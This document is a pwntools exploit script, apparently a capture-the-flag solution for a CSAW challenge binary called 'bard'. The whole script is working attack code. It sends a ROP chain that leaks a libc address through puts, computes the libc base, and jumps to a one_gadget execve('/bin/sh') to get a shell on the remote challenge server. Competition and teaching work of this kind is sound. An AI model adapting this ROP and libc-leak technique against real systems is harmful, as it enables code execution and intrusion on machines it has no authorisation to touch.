#!/usr/bin/env python3

from pwn import *

exe = ELF("./bard", checksec=False)
libc = ELF("./libc-2.27.so", checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.binary = exe
context.terminal = 'tmux split -h'.split(' ')
context.arch = 'amd64'

"""
0x4f365 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""

og_delta = 0x10a45c

if args.REMOTE:
    p = remote('pwn.chal.csaw.io', 5019)
else:
    p = process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

    if args.GDB:
        gdb.attach(p, '''
            break * 0x40107a
            continue
            ''')

def choose_ge(choice):
    p.sendlineafter(b'evil):\n', choice)

def choose_g(name, weapon):
    choose_ge(b'g')
    p.sendlineafter(b'acy\n', str(weapon).encode())
    p.sendafter(b'name:\n', name)

def choose_e(name, weapon):
    choose_ge(b'e')
    p.sendlineafter(b'ment\n', str(weapon).encode())
    p.sendafter(b'name:\n', name)

def move():
    p.sendlineafter(b'(r)un\n', b'r')

history_addr = 0x400F7C

def send_payload(payload):
    choose_g(b'A' * 4, 1)

    for _ in range(8):
        choose_e(b'B' * 4, 1)

    choose_g(payload, 1)

    for _ in range(10):
        move()

# 1. Leak libc address

rop = ROP(exe)
rop.call('puts', [exe.got.puts])
rop.call(history_addr)

payload = rop.chain()

send_payload(payload)

p.recvuntil(b'away.\n')

puts_addr = u64(p.recv(6).ljust(8, b'\x00'))
libc.address = puts_addr - libc.sym.puts
bin_sh_addr = next(libc.search(b'/bin/sh\x00'))
og_addr = libc.address + og_delta

log.info(f'puts @ {hex(puts_addr)}')
log.info(f'libc @ {hex(libc.address)}')
log.info(f'system @ {hex(libc.sym.system)}')
log.info(f'/bin/sh @ {hex(bin_sh_addr)}')
log.info(f'og @ {hex(og_addr)}')

# 2. Execute system('/bin/sh')

rop = ROP(exe)
# rop.call(libc.sym.system, [bin_sh_addr])
rop.call(og_addr)

payload = rop.chain()

send_payload(payload)

p.interactive()
